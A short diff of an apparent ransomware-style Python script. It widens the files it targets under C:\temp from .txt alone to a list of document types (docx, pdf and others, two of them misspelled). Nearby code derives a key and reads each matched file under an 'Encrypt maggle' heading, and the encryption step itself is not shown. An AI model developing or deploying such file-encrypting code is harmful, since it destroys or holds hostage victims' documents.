@@ -24,6 +24,7 @@ def encPwd():
     return key
 
 encPwd = encPwd()
+extList = ["txt", "docx", "xslx", "doc", "xsl", "pdf"]
 
 ### Encrypt maggle
 
@@ -31,7 +32,7 @@ for (dirpath, dirnames, filenames) in os.walk('C:\\temp'):
     branch = dirpath
     for file in filenames:
         fullname = branch + "\\" + file
-        if fullname.endswith('.txt'):
+        if (fullname.split('.')[-1] in extList):
             with open(fullname, 'r') as content_file:
                 content = content_file.read()
 
